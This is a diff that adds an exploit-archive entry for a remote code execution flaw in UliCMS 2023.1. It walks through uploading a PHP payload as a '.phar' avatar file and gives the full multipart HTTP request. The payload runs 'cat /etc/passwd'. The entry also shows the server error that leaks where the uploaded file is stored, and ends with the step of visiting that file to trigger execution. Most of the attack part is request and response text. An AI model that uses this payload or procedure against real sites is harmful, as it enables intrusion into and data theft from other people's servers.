@@ -1,0 +1,159 @@
+id: 38669
+date: 05/05/2023
+title: Ulicms 2023.1 sniffing-vicuna - Remote Code Execution Vulnerability
+author: Mirabbas Ağalarov
+cves: 
+
+#Exploit Title: Ulicms-2023.1 sniffing-vicuna - Remote Code Execution (RCE)
+#Application: Ulicms
+#Version: 2023.1-sniffing-vicuna
+#Bugs:  RCE
+#Technology: PHP
+#Vendor URL: https://en.ulicms.de/
+#Software Link: https://www.ulicms.de/content/files/Releases/2023.1/ulicms-2023.1-sniffing-vicuna-full.zip
+#Date of found: 04-05-2023
+#Author: Mirabbas Ağalarov
+#Tested on: Linux 
+
+2. Technical Details & POC
+========================================
+steps: 
+
+1. Login to account and edit profile.
+
+2.Upload new Avatar
+
+3. It is possible to include the php file with the phar extension when uploading the image. Rce is triggered when we visit it again. File upload error may occur, but this does not mean that the file is not uploaded and the file location is shown in the error
+
+payload: <?php echo system("cat /etc/passwd"); ?>
+
+poc request :
+
+POST /dist/admin/index.php HTTP/1.1
+Host: localhost
+Content-Length: 1982
+Cache-Control: max-age=0
+sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Linux"
+Upgrade-Insecure-Requests: 1
+Origin: http://localhost
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYB7QS1BMMo1CXZVy
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: http://localhost/dist/admin/index.php?action=admin_edit&id=12&ref=home
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: 64534366316f0_SESSION=g9vdeh7uafdagkn6l8jdk2delv
+Connection: close
+
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="csrf_token"
+
+e2d428bc0585c06c651ca8b51b72fa58
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="sClass"
+
+UserController
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="sMethod"
+
+update
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="avatar"; filename="salam.phar"
+Content-Type: application/octet-stream
+
+<?php echo system("cat /etc/passwd"); ?>
+
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="edit_admin"
+
+edit_admin
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="id"
+
+12
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="firstname"
+
+account1
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="lastname"
+
+account1
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="email"
+
+account1@test.com
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="password"
+
+
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="password_repeat"
+
+
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="group_id"
+
+1
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="secondary_groups[]"
+
+1
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="homepage"
+
+
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="html_editor"
+
+ckeditor
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="admin"
+
+1
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="default_language"
+
+
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy
+Content-Disposition: form-data; name="about_me"
+
+
+------WebKitFormBoundaryYB7QS1BMMo1CXZVy--
+
+
+
+response:
+
+Error
+GmagickException: No decode delegate for this image format (/var/www/html/dist/content/tmp/645364e62615b.phar) in /var/www/html/dist/vendor/imagine/imagine/src/Gmagick/Imagine.php:67
+Stack trace:
+#0 /var/www/html/dist/vendor/imagine/imagine/src/Gmagick/Imagine.php(67): Gmagick->__construct()
+#1 /var/www/html/dist/App/non_namespaced/User.php(1110): Imagine\Gmagick\Imagine->open()
+#2 /var/www/html/dist/App/non_namespaced/User.php(1089): User->processAvatar()
+#3 /var/www/html/dist/content/modules/core_users/controllers/UserController.php(124): User->changeAvatar()
+#4 /var/www/html/dist/App/non_namespaced/Controller.php(82): UserController->updatePost()
+#5 /var/www/html/dist/App/non_namespaced/ControllerRegistry.php(67): Controller->runCommand()
+#6 /var/www/html/dist/admin/index.php(66): ControllerRegistry::runMethods()
+#7 {main}
+
+Next Imagine\Exception\RuntimeException: Unable to open image /var/www/html/dist/content/tmp/645364e62615b.phar in /var/www/html/dist/vendor/imagine/imagine/src/Gmagick/Imagine.php:73
+Stack trace:
+#0 /var/www/html/dist/App/non_namespaced/User.php(1110): Imagine\Gmagick\Imagine->open()
+#1 /var/www/html/dist/App/non_namespaced/User.php(1089): User->processAvatar()
+#2 /var/www/html/dist/content/modules/core_users/controllers/UserController.php(124): User->changeAvatar()
+#3 /var/www/html/dist/App/non_namespaced/Controller.php(82): UserController->updatePost()
+#4 /var/www/html/dist/App/non_namespaced/ControllerRegistry.php(67): Controller->runCommand()
+#5 /var/www/html/dist/admin/index.php(66): ControllerRegistry::runMethods()
+#6 {main}
+
+
+4. Go to /var/www/html/dist/content/tmp/645364e62615b.phar (http://localhost/dist/content/tmp/645364e62615b.phar)
+
+#  0day.today [2023-05-22]  #
